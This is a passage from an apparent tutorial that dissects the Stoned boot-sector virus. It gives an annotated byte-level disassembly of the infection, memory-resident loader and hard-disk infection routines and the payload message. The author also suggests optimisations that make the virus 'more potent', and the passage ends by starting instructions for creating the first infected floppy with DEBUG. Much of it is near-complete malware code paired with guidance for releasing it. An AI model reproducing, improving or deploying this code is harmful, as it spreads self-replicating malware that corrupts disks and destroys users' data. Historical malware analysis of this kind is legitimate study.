<p class=MsoNormal>Most assemblers provide a way to force a JMP instance to
single-byte-offset form (a standard error is generated if the destination is,
in fact, out of reach). Some assemblers (like Borland’s TASM) allow you to
specify the number of passes used to resolve forward-references. With an extra
pass or two, the assembler can eliminate the wasted NOPs.</p>

<p class=MsoNormal>Searching the code for forward jumps reveals only two: this
one and the one at the one at 0105. Closing up these wasted bytes frees two
more bytes of memory – five so far.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; At this point the drive is
  responding - load the bootsector into virus memory segment</p>
  <p class=Panel style='border:none;padding:0in'>; and check if it has been
  infected.</p>
  <p class=Panel style='border:none;padding:0in'>0066: 33 F6             XOR    
  SI,SI                   ; Virus starting point</p>
  <p class=Panel style='border:none;padding:0in'>0068: BF 0200          
  MOV     DI,0200                 ; Just read bootsector</p>
  <p class=Panel style='border:none;padding:0in'>006B: FC               
  CLD                             ; Moving forward</p>
  <p class=Panel style='border:none;padding:0in'>006C: 0E               
  PUSH    CS                      ; Set DS to ...</p>
  <p class=Panel style='border:none;padding:0in'>006D: 1F               
  POP     DS                      ; ... code segment</p>
  <p class=Panel style='border:none;padding:0in'>006E: AD               
  LODSW                           ; First word of virus</p>
  <p class=Panel style='border:none;padding:0in'>006F: 3B 05            
  CMP     AX,[DI]                 ; Looks the same as bootsector?</p>
  <p class=Panel style='border:none;padding:0in'>0071: 75 06            
  JNZ     0079                    ; No ... we need to infect</p>
  <p class=Panel style='border:none;padding:0in'>0073: AD               
  LODSW                           ; Compare second words to be sure</p>
  <p class=Panel style='border:none;padding:0in'>0074: 3B 45 02         
  CMP     AX,[DI+02]              ; Looks the same?</p>
  <p class=Panel style='border:none;padding:0in'>0077: 74 21            
  JZ      009A                    ; Yes ... already infected</p>
  <p class=Panel style='border:none;padding:0in'>;</p>
  <p class=Panel style='border:none;padding:0in'>; Bootsector is not infected -
  move original into FAT table and write virus to bootsector.</p>
  <p class=Panel style='border:none;padding:0in'>0079: B8 0301          
  MOV     AX,0301                 ; Write one sector</p>
  <p class=Panel style='border:none;padding:0in'>007C: BB 0200          
  MOV     BX,0200                 ; Point to original boot</p>
  <p class=Panel style='border:none;padding:0in'>007F: B1 03            
  MOV     CL,03                   ; Cyl 0, Sec 3</p>
  <p class=Panel style='border:none;padding:0in'>0081: B6 01            
  MOV     DH,01                   ; Head 1, Drive 0</p>
  <p class=Panel style='border:none;padding:0in'>0083: 9C                PUSHF                          
  ; Set stack as if an interrupt</p>
  <p class=Panel style='border:none;padding:0in'>0084: 2E FF 1E 09 00   
  CALL    [CS:0009]               ; Hold original bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0089: 72 0F            
  JB      009A                    ; Error ... out of here</p>
  <p class=Panel style='border:none;padding:0in'>008B: B8 0301           MOV   
   AX,0301                 ; Write one sector</p>
  <p class=Panel style='border:none;padding:0in'>008E: 33 DB            
  XOR     BX,BX                   ; At offset 0</p>
  <p class=Panel style='border:none;padding:0in'>0090: B1 01            
  MOV     CL,01                   ; Sector 1</p>
  <p class=Panel style='border:none;padding:0in'>0092: 33 D2            
  XOR     DX,DX                   ; Drive head 0</p>
  <p class=Panel style='border:none;padding:0in'>0094: 9C               
  PUSHF                           ; As if an interrupt</p>
  <p class=Panel style='border:none;padding:0in'>0095: 2E FF 1E 09 00   
  CALL    FAR [CS:0009]           ; Write virus to normal boot entry</p>
  <p class=Panel style='border:none;padding:0in'>;</p>
  <p class=Panel style='border:none;padding:0in'>; Restore original parameters
  to INT 13 request (about to do original INT 13.)</p>
  <p class=Panel style='border:none;padding:0in'>009A: 5F                POP    
  DI                      ; Restore all ...</p>
  <p class=Panel style='border:none;padding:0in'>009B: 5E               
  POP     SI                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>009C: 07               
  POP     ES                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>009D: 5A               
  POP     DX                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>009E: 59               
  POP     CX                      ; ...</p>
  <p class=Panel style='border:none;padding:0in'>009F: 5B               
  POP     BX                      ; ... Registers</p>
  <p class=Panel style='border:none;padding:0in'>00A0: C3               
  RET                             ; Done</p>
  <p class=Panel style='border:none;padding:0in'>;-----------------------------------------------------------------</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>The rest of the Infector code is straightforward. The
current bootsector is loaded from the floppy into memory. If the first four
bytes of the sector match the virus, the sector must already be infected and
the virus leaves it alone. Otherwise, the original sector is written to a
holding place on the floppy (cylinder 0, sector 3, head 1). Then the virus
writes itself into the bootsector completing the infection process. Finally,
the original INT13 routine is invoked to handle the incoming request for the calling
program.</p>

<p class=MsoNormal>There is nothing special about the holding sector – it
appears to be a sector deep in the files area of the floppy. If the floppy
begins to fill up, this sector could get over-written corrupting the boot
process. The floppy will no longer be bootable, but no file damage will occur.
If the virus infects a floppy that is almost filled up, it will blindly write
the bootsector over any data stored in the holding sector. In this case, file
damage does occur.</p>

<p class=MsoNormal>On fixed-disks, the holding place is cylinder 0, sector 7,
head 0, which is near the end of the root directory. If the fixed-disk has more
than 96 entries in the root directory, the same kind of corruption will occur.</p>

<h3>The Loader</h3>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>;-----------------------------------------------------------------</p>
  <p class=Panel style='border:none;padding:0in'>; Loader</p>
  <p class=Panel style='border:none;padding:0in'>;-----------------------------------------------------------------</p>
  <p class=Panel style='border:none;padding:0in'>; Executes on bootup</p>
  <p class=Panel style='border:none;padding:0in'>00A1: 33 C0            
  XOR     AX,AX                   ; Set DS to ...</p>
  <p class=Panel style='border:none;padding:0in'>00A3: 8E D8            
  MOV     DS,AX                   ; ... system segment</p>
  <p class=Panel style='border:none;padding:0in'>00A5: FA               
  CLI                             ; No interrupts through here</p>
  <p class=Panel style='border:none;padding:0in'>00A6: 8E D0            
  MOV     SS,AX                   ; Set a temporary ...</p>
  <p class=Panel style='border:none;padding:0in'>00A8: BC 7C00          
  MOV     SP,7C00                 ; ... stack </p>
  <p class=Panel style='border:none;padding:0in'>00AB: FB                STI   
                           ; Interrupts can happen now</p>
  <p class=Panel style='border:none;padding:0in'>00AC: A1 004C          
  MOV     AX,[DS:004C]            ; Save ...</p>
  <p class=Panel style='border:none;padding:0in'>00AF: A3 7C09          
  MOV     [DS:7C09],AX            ; ... original ...</p>
  <p class=Panel style='border:none;padding:0in'>00B2: A1 004E          
  MOV     AX,[DS:004E]            ; ... INT 13 ...</p>
  <p class=Panel style='border:none;padding:0in'>00B5: A3 7C0B          
  MOV     [DS:7C0B],AX            ; ... vector.</p>
  <p class=Panel style='border:none;padding:0in'>00B8: A1 0413          
  MOV     AX,[DS:0413]            ; Number of K bytes in free memory</p>
  <p class=Panel style='border:none;padding:0in'>00BB: 48               
  DEC     AX                      ; Reserve ...</p>
  <p class=Panel style='border:none;padding:0in'>00BC: 48                DEC    
  AX                      ; ... 2K for virus (and buffer)</p>
  <p class=Panel style='border:none;padding:0in'>00BD: A3 0413          
  MOV     [DS:0413],AX            ; New number of available K bytes</p>
  <p class=Panel style='border:none;padding:0in'>00C0: B1 06            
  MOV     CL,06                   ; Convert K byte number ...</p>
  <p class=Panel style='border:none;padding:0in'>00C2: D3 E0            
  SHL     AX,CL                   ; ... to segment address</p>
  <p class=Panel style='border:none;padding:0in'>00C4: 8E C0            
  MOV     ES,AX                   ; MOVSB destination: virus segment</p>
  <p class=Panel style='border:none;padding:0in'>00C6: A3 7C0F          
  MOV     [DS:7C0F],AX            ; Store virus segment in our area</p>
  <p class=Panel style='border:none;padding:0in'>00C9: B8 0015          
  MOV     AX,0015                 ; Offset to new INT13 handle</p>
  <p class=Panel style='border:none;padding:0in'>00CC: A3 004C          
  MOV     [DS:004C],AX            ; New INT13 offset ...</p>
  <p class=Panel style='border:none;padding:0in'>00CF: 8C 06 004E       
  MOV     [DS:004E],ES            ; ... and segment</p>
  <p class=Panel style='border:none;padding:0in'>00D3: B9 01B8           MOV    
  CX,01B8                 ; Bytes in virus</p>
  <p class=Panel style='border:none;padding:0in'>00D6: 0E               
  PUSH    CS                      ; DS points to ...</p>
  <p class=Panel style='border:none;padding:0in'>00D7: 1F               
  POP     DS                      ; ... segment with virus code</p>
  <p class=Panel style='border:none;padding:0in'>00D8: 33 F6            
  XOR     SI,SI                   ; Offsets are both ...</p>
  <p class=Panel style='border:none;padding:0in'>00DA: 8B FE            
  MOV     DI,SI                   ; ... zero</p>
  <p class=Panel style='border:none;padding:0in'>00DC: FC               
  CLD                             ; Moving forward</p>
  <p class=Panel style='border:none;padding:0in'>00DD: F3 A4            
  REPZ    MOVSB                   ; Move virus into top of memroy</p>
  <p class=Panel style='border:none;padding:0in'>00DF: 2E FF 2E 0D 00   
  JMP     FAR [CS:000D]           ; Continue with next instruction in</p>
  <p class=Panel style='border:none;padding:0in'>                                                       
  ; new segment.</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Now we come to 00A1 – the destination of the jumps in the
first few bytes of the program. Remember that the computer is booting up at
this point, and the virus has just been loaded into memory at 0000:7C00. The CS
register has been re-oriented so that this instruction is executed at
07C0:00A1. First the virus suspends all interrupts and establishes a temporary
stack. Then the original INT13 vector is saved in the virus’s data block.</p>

<p class=MsoNormal>The ROM bootstrap writes the amount of RAM (number of 1K
chunks) as a byte to location 0000:0413. This is the value reported by INT 12.
The virus takes the last two 1K-chunks from the memory pool by subtracting 2
from this location. The virus then calculates the segment address of the
reserved area and copies its entire length from 0000:7C00 to the permanent
location.  </p>

<p class=MsoNormal>Why 2K? The virus is only ½K in length – it just fits in the
512-byte bootsector of a floppy, and it needs only ½K to live in. However, the
virus must check (by loading) the bootsectors of disks into memory. Since the
virus checks the fixed disk (as we will see), the read buffer must be 1K long;
the virus is expecting fixed disks to use 1K sectors. Memory is reserved in 1K
chunks, and the virus sets aside 2K to fill its 1.5K needs.</p>

<p class=MsoNormal>The segment value of the reserved memory is written into the
virus data area at 000F – just behind the offset value of 00E4. The indirect
jump at 00DF makes a far jump from 07C0:00DF to RRRR:00E4 where RRRR is the
reserved segment. The program picks up at the very next instruction in the
listing except now it is running in its new home at the top of RAM.</p>

<p class=MsoNormal>This is a clever but confusing jump. If we think about it,
all the virus is doing with this jump is changing the CS register to point to
the new segment. The instruction pointer within the segment is the same no
matter which segment the code is in. An easier way to change the CS register is
to push ES, which contains the new segment, and then pop the CS register from
the stack. Unfortunately, the POP CS instruction is not implemented by the
architecture! I guess this instruction is more dangerous than useful – and how
often would the instruction be needed?</p>

<p class=MsoNormal>There is still an easier way to make the jump, however. The
JMP instruction at 00DF can be changed to a direct FAR jump like this: 00DF: EA
E4 00 RRRR (JMP RRRR:00E4). The segment value RRRR is not know until run time,
but the MOV at location 00CF could be changed to write the segment value in ES
into the code memory at offset 00E1. Then when the CPU gets to the instruction
a few cycles later, it will know exactly where to go! This is called
“self-modifying” code since the program actually writes its own instructions as
it executes.  Changing the JMP eliminates the four bytes of data at 000D. That
brings our savings up to 9 bytes. </p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; At this point virus is
  running in its new 2K home at the end of RAM.</p>
  <p class=Panel style='border:none;padding:0in'>00E4: B8 0000           MOV    
  AX,0000                 ; Reset disk system (prepare for IO)</p>
  <p class=Panel style='border:none;padding:0in'>00E7: CD 13            
  INT     13                      ; Disk now ready</p>
  <p class=Panel style='border:none;padding:0in'>00E9: 33 C0            
  XOR     AX,AX                   ; Set ES to ...</p>
  <p class=Panel style='border:none;padding:0in'>00EB: 8E C0            
  MOV     ES,AX                   ; ... system segment</p>
  <p class=Panel style='border:none;padding:0in'>00ED: B8 0201          
  MOV     AX,0201                 ; Read 1 sector</p>
  <p class=Panel style='border:none;padding:0in'>00F0: BB 7C00          
  MOV     BX,7C00                 ; Read location = normal boot buffer</p>
  <p class=Panel style='border:none;padding:0in'>00F3: 2E 80 3E 0008 00 
  CMP     BYTE PTR [CS:0008],00   ; Are we booting from a hard-disk?</p>
  <p class=Panel style='border:none;padding:0in'>00F9: 74 0B            
  JZ      0106                    ; No ... use floppy hold sector</p>
  <p class=Panel style='border:none;padding:0in'>00FB: B9 0007          
  MOV     CX,0007                 ; Cyl 0, Sec 7</p>
  <p class=Panel style='border:none;padding:0in'>00FE: BA 0080          
  MOV     DX,0080                 ; Head 0, Drive 80</p>
  <p class=Panel style='border:none;padding:0in'>0101: CD 13            
  INT     13                      ; Read original boot from storage</p>
  <p class=Panel style='border:none;padding:0in'>0103: EB 49            
  JMP     014E                    ; Continue with normal boot</p>
  <p class=Panel style='border:none;padding:0in'>0105: 90               
  NOP                             ; (Assembler fill)</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Once the virus has relocated, the parameters are set for
loading the original bootsector into memory, but the virus has to find where it
put the original bootsector. As we saw, this location is different depending on
the type of disk. If the computer is booting from a fixed-disk, the virus
simply loads the original bootsector and executes it. This initiates the normal
boot process (with the INT13 Infector permanently installed). </p>

<p class=MsoNormal>If the virus is booting from a floppy, it does the extra
work of infecting any fixed-disk on the system. There is also a random chance
of getting the Stoned message on the screen if the computer is booting from a
floppy. We’ll see that code in a moment.</p>

<p class=MsoNormal>Notice the instruction at 00E4. AX is used to pass
information into the INT13; AH contains the sub-command and AL contains some
additional data. Using immediate MOVs to load parameters into registers for INT
calls is second nature to 8x86 programmers, and we generally find immediate
MOVs before any INTx instruction. However, at 00E4 the programmer could have
saved a byte by doing an “XOR  AX,AX” (which results in 0000). That brings our
code savings up to 10 bytes.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>;</p>
  <p class=Panel style='border:none;padding:0in'>; We are booting up from a
  floppy – load the original sector and perhaps print a message.</p>
  <p class=Panel style='border:none;padding:0in'>0106: B9 0003           MOV    
  CX,0003                 ; Cyl 0, Sec 3 </p>
  <p class=Panel style='border:none;padding:0in'>0109: BA 0100          
  MOV     DX,0100                 ; Head 1, Drive 0</p>
  <p class=Panel style='border:none;padding:0in'>010C: CD 13            
  INT     13                      ; Load the original bootsector</p>
  <p class=Panel style='border:none;padding:0in'>010E: 72 3E            
  JB      014E                    ; Error – not much else we can do</p>
  <p class=Panel style='border:none;padding:0in'>0110: 26 F6 06 046C 07 
  TEST    BYTE PTR [ES:046C],07   ; Low byte of timer (random)</p>
  <p class=Panel style='border:none;padding:0in'>0116: 75 12            
  JNZ     012A                    ; Skip over 7/8 of the time</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>At 0106, the virus loads the original bootsector from the
floppy.  The conditional jump at 010E checks for any access errors, but this is
really just a waste of space. If the original bootsector can’t be loaded, the
system will not come up no matter what the virus does. The jump transfers execution
to 0000:7C00, which still contains the virus sector. An endless loop begins.</p>

<p class=MsoNormal> Error checking is only useful if you have the ability to
recover from the error. Since there isn’t much in the way of recovery at this
point, I would have simply left out the two-byte conditional jump at 010E. But
there is an even better reason to leave out the check: leaving it out makes the
virus more potent. The code following this check tries to infect the fixed-disk
– which might work even if the floppy isn’t responding. By handling the error
at 010E, the virus rules out a potential infection. Leaving out the two-byte
conditional jump brings our savings up to 12 bytes.</p>

<p class=MsoNormal>If booting from a floppy, the virus checks the low byte of
the ever-changing clock-tick in memory at 0000:046C. A hardware clock
interrupts the CPU several times a second, and the clock-handler routine
increments the word at 0000:046C. There is no way to know what the clock-tick
will be at this point – this is essentially a random number. The test at 0116 will
fall through to the next section of code if the lower three bits of the timer
are all 0’s. If you boot your PC from an infected floppy, you will see the
famous “Your PC is now stoned!” message on average of once every eight
boot-ups.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; If a PC boots from an
  infected floppy this message will be printed on average of one out </p>
  <p class=Panel style='border:none;padding:0in'>; of every eight boot ups.</p>
  <p class=Panel style='border:none;padding:0in'>0118: BE 0189          
  MOV     SI,0189                 ; Message</p>
  <p class=Panel style='border:none;padding:0in'>011B: 0E               
  PUSH    CS                      ; Set DS ...</p>
  <p class=Panel style='border:none;padding:0in'>011C: 1F                POP    
  DS                      ; ... to virus segment</p>
  <p class=Panel style='border:none;padding:0in'>011D: AC               
  LODSB                           ; Get byte in message</p>
  <p class=Panel style='border:none;padding:0in'>011E: 0A C0            
  OR      AL,AL                   ; Last loaded?</p>
  <p class=Panel style='border:none;padding:0in'>0120: 74 08            
  JZ      012A                    ; Yes ... done with message</p>
  <p class=Panel style='border:none;padding:0in'>0122: B4 0E            
  MOV     AH,0E                   ; Teletype mode</p>
  <p class=Panel style='border:none;padding:0in'>0124: B7 00            
  MOV     BH,00                   ; Base of screen</p>
  <p class=Panel style='border:none;padding:0in'>0126: CD 10            
  INT     10                      ; Print character</p>
  <p class=Panel style='border:none;padding:0in'>0128: EB F3            
  JMP     011D                    ; Do all characters</p>
  <p class=Panel style='border:none;padding:0in'>;</p>
  <p class=Panel style='border:none;padding:0in'>012A: 0E               
  PUSH    CS                      ; Set ES ...</p>
  <p class=Panel style='border:none;padding:0in'>012B: 07               
  POP     ES                      ; ... to CS</p>
  <p class=Panel style='border:none;padding:0in'>012C: B8 0201          
  MOV     AX,0201                 ; Read current boot from C:</p>
  <p class=Panel style='border:none;padding:0in'>012F: BB 0200          
  MOV     BX,0200                 ; Buffer after virus</p>
  <p class=Panel style='border:none;padding:0in'>0132: B1 01            
  MOV     CL,01                   ; Cyl = 0 (still), Sec = 1</p>
  <p class=Panel style='border:none;padding:0in'>0134: BA 0080          
  MOV     DX,0080                 ; Head = 0, Drive = 80</p>
  <p class=Panel style='border:none;padding:0in'>0137: CD 13            
  INT     13                      ; Read current bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0139: 72 13            
  JB      014E                    ; Error ... no fixed-disk available</p>
  <p class=Panel style='border:none;padding:0in'>013B: 0E               
  PUSH    CS                      ; Set DS ...</p>
  <p class=Panel style='border:none;padding:0in'>013C: 1F               
  POP     DS                      ; ... to CS</p>
  <p class=Panel style='border:none;padding:0in'>013D: BE 0200          
  MOV     SI,0200                 ; Current bootsector data</p>
  <p class=Panel style='border:none;padding:0in'>0140: BF 0000          
  MOV     DI,0000                 ; Virus data</p>
  <p class=Panel style='border:none;padding:0in'>0143: AD                LODSW                          
  ; Get first word of bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0144: 3B 05            
  CMP     AX,[DI]                 ; Same as virus?</p>
  <p class=Panel style='border:none;padding:0in'>0146: 75 11            
  JNZ     0159                    ; No ... infect it</p>
  <p class=Panel style='border:none;padding:0in'>0148: AD               
  LODSW                           ; Yes ... try second word</p>
  <p class=Panel style='border:none;padding:0in'>0149: 3B 45 02         
  CMP     AX,[DI+02]              ; Bootsector looks like virus?</p>
  <p class=Panel style='border:none;padding:0in'>014C: 75 0B            
  JNZ     0159                    ; No ... infect it</p>
  <p class=Panel style='border:none;padding:0in'>&nbsp;</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Once the message is printed (or skipped), the virus continues
at 012A. Here the virus attempts to load the bootsector from a fixed-disk. If
an error occurs, the virus continues with the normal boot up process. This time
the error checking is needed since the error is likely – it could mean that
there is no fixed-disk in the computer. Ah, those were the days!</p>

<p class=MsoNormal>If the first four bytes of the loaded bootsector match the
virus, the disk is already infected and the original bootsector is executed
with the following section of code. Otherwise, the hard-disk infection continues
at 0159.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; No matter how virus loaded,
  it infects only floppy disks that get a copy of the</p>
  <p class=Panel style='border:none;padding:0in'>; memory-resident copy of the
  virus. We want floppies to have media type = 0.</p>
  <p class=Panel style='border:none;padding:0in'>014E: 2E C6 06 0008 00 
  MOV     BYTE PTR [CS:0008],0    ; Media type = floppy.</p>
  <p class=Panel style='border:none;padding:0in'>0154: 2E FF 2E 11 00   
  JMP     [CS:0011]               ; Continue with normal bootsector</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>This is how the virus finishes its loading by executing the
original bootsector, which was loaded from disk earlier. Once again an indirect
jump is used where a direct, intrasegment jump is better. The direct jump
occupies the same space (five bytes) and executes a little faster. Replacing
the five bytes at 0154 with a direct jump eliminates the need for the four
bytes of storage at 0011. That brings our savings up to 16 bytes.</p>

<p class=MsoNormal>The very last thing the virus does before turning control
over to the original bootsector is change the media-type flag to 0 (floppy) no
matter how the virus booted. Once it is loaded into memory, the virus only
infects floppies. To infect a floppy, the virus copies the entire
memory-resident virus to the bootsector of the disk – the media-type flag is
set to zero for once and for all.</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; Infect hard-drive</p>
  <p class=Panel style='border:none;padding:0in'>0159: 2E C6 06 0008 02 
  MOV     BYTE PTR [CS:0008],2    ; Store virus on C: with flag set</p>
  <p class=Panel style='border:none;padding:0in'>015F: B8 0301          
  MOV     AX,0301                 ; Write 1 sector</p>
  <p class=Panel style='border:none;padding:0in'>0162: BB 0200          
  MOV     BX,0200                 ; Original bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0165: B9 0007          
  MOV     CX,0007                 ; Cyl = 0, Sec = 7</p>
  <p class=Panel style='border:none;padding:0in'>0168: BA 0080           MOV     DX,0080                
  ; Head = 0, Drive = 80</p>
  <p class=Panel style='border:none;padding:0in'>016B: CD 13            
  INT     13                      ; Store original boot in FAT</p>
  <p class=Panel style='border:none;padding:0in'>016D: 72 DF            
  JB      014E                    ; Error ... out of here</p>
  <p class=Panel style='border:none;padding:0in'>; Floppies are assumed to have
  512 byte sectors (0200 hex) which is just barely</p>
  <p class=Panel style='border:none;padding:0in'>; room for the virus. Fixed
  disks are assumed to have twice that - 1K sectors (0400).</p>
  <p class=Panel style='border:none;padding:0in'>; The last 512 bytes of a
  fixed-disk boot record contain four partition descriptors.</p>
  <p class=Panel style='border:none;padding:0in'>; These descriptors describe
  the partitions and must be present in the infected</p>
  <p class=Panel style='border:none;padding:0in'>; sector - this code copies
  the descriptors into the virus sector buffer before writing</p>
  <p class=Panel style='border:none;padding:0in'>; it to disk.</p>
  <p class=Panel style='border:none;padding:0in'>016F: 0E               
  PUSH    CS                      ; Set DS ...</p>
  <p class=Panel style='border:none;padding:0in'>0170: 1F               
  POP     DS                      ; ... to CS</p>
  <p class=Panel style='border:none;padding:0in'>0171: 0E               
  PUSH    CS                      ; Set ES ...</p>
  <p class=Panel style='border:none;padding:0in'>0172: 07               
  POP     ES                      ; ... to CS</p>
  <p class=Panel style='border:none;padding:0in'>0173: BE 03BE          
  MOV     SI,03BE                 ; Copy partition ...</p>
  <p class=Panel style='border:none;padding:0in'>0176: BF 01BE           MOV    
  DI,01BE                 ; ... descriptors ...</p>
  <p class=Panel style='border:none;padding:0in'>0179: B9 0242          
  MOV     CX,0242                 ; ... into ...</p>
  <p class=Panel style='border:none;padding:0in'>017C: F3 A4            
  REPZ    MOVSB                   ; ... virus sector buffer.</p>
  <p class=Panel style='border:none;padding:0in'>017E: B8 0301          
  MOV     AX,0301                 ; Write one sector</p>
  <p class=Panel style='border:none;padding:0in'>0181: 33 DB            
  XOR     BX,BX                   ; Offset 0</p>
  <p class=Panel style='border:none;padding:0in'>0183: FE C1            
  INC     CL                      ; Cyl = 0, Sec = 1</p>
  <p class=Panel style='border:none;padding:0in'>0185: CD 13            
  INT     13                      ; Write infected bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0187: EB C5            
  JMP     014E                    ; Continue with normal bootsector</p>
  <p class=Panel style='border:none;padding:0in'>0189: 07 59 6F 75 72 20 50 ;
  07,'Your PC is now STONED!',07,0dh,0ah,0ah,00</p>
  <p class=Panel style='border:none;padding:0in'>      43 20 69 73 20 6E 6F</p>
  <p class=Panel style='border:none;padding:0in'>      77 20 53 54 4F 4E 45</p>
  <p class=Panel style='border:none;padding:0in'>      44 21 07 0D 0A 0A 00</p>
  <p class=Panel style='border:none;padding:0in'>; This is part of the virus
  but is never printed on the screen (notice no CR/LF on the end)</p>
  <p class=Panel style='border:none;padding:0in'>01A5: 4C 45 47 41 4C 49 53 ;
  'LEGALISE MARIJUANA!'</p>
  <p class=Panel style='border:none;padding:0in'>      45 20 4D 41 52 49 4A</p>
  <p class=Panel style='border:none;padding:0in'>      55 41 4E 41 21</p>
  <p class=Panel style='border:none;padding:0in'>01B8:</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>As the above code shows, infecting a fixed-disk’s bootsector
is slightly more complicated. In general, fixed-disks have 1K sectors (twice as
large as the sectors on a floppy). The first half of the sector contains a
normal bootsector program, but the last half contains a special data-area that
describes all of the partitions on the drive. The flags in this area indicate
which partition is active and what kind of file-system each partition contains.
The virus must be careful to preserve this partition-table before replacing the
existing bootsector. The string operation at 017C copies the partition table
from the end of the original bootsector onto the end of the virus.</p>

<p class=MsoNormal>Interestingly, one mutation of this virus known as the
Monkey Virus dropped this check in order to make room for other functionality.
Most operating systems depend on the information in the partition-table, and a
Monkey infested fixed-disk is often unusable.</p>

<p class=MsoNormal>At 0189 we see the famous “stoned” message. Note the 07
character embedded in the text. When printed in teletype mode, this character
rings the bell (or beeps the speaker).</p>

<p class=MsoNormal>Notice the ASCII string beginning at 01A5. This string has
no terminating 0 or carriage-return or line-feed. Even though the data is part
of the virus, it is just a signature; nobody ever sees it – except, of course,
computer archeologists like you! Many variations of the virus simply extend the
printed message into this area. </p>

<p class=MsoNormal>One variation of this virus, the famous Michelangelo virus,
contains a malicious code fragment in place of the harmless message routine.
The code checks the system clock, and on March 6<sup>th</sup>, it enters an
endless loop of filling up the sectors on the disk with the bootsector. Since
the FAT table is first on the disk, Michelangelo renders a disk useless in the
blink of an eye.</p>

<p class=MsoNormal>Space is a problem for bootsector viruses – a floppy
bootsector is only 512 bytes long, and on a fixed-disk, the partition-table
begins at offset 01BE. This gives the virus only 1BE bytes to work with, yet
the Stoned virus does quite a lot with several bytes to spare. If you want to
make modifications to the virus, you can re-compile it with the recommended
changes and squeeze out an extra 16 bytes. You could even ditch the message
(and printing routine) completely if you need space for more code.</p>

<h2>The First Case</h2>

<p class=MsoNormal>We have seen how the Stoned virus spreads from one infected
disk to another, but how did the first floppy get infected? The procedure is
actually very easy – you already have all the tools you need to bring this
virus back to life!</p>

<p class=MsoNormal>First, you need a boot-floppy made with “format /s”. The
Stoned virus was designed for 360K 5.25” floppies. I had bad luck trying to put
the virus on a 3.5” disk.</p>

<p class=MsoNormal>The virus copies the original bootsector to cylinder 0,
sector 3, head 1 of the floppy. You can do this with DEBUG (a standard
command-prompt utility shipped with all PC operating systems). Using the
assembler built into DEBUG, you can copy the bootsector to the expected holding
place as shown with the DEBUG session below:</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>&gt;debug</p>
  <p class=Panel style='border:none;padding:0in'>- L 200 0 0 1</p>
  <p class=Panel style='border:none;padding:0in'>- A</p>
  <p class=Panel style='border:none;padding:0in'>  mov ax,0301</p>
  <p class=Panel style='border:none;padding:0in'>  mov bx,0200</p>
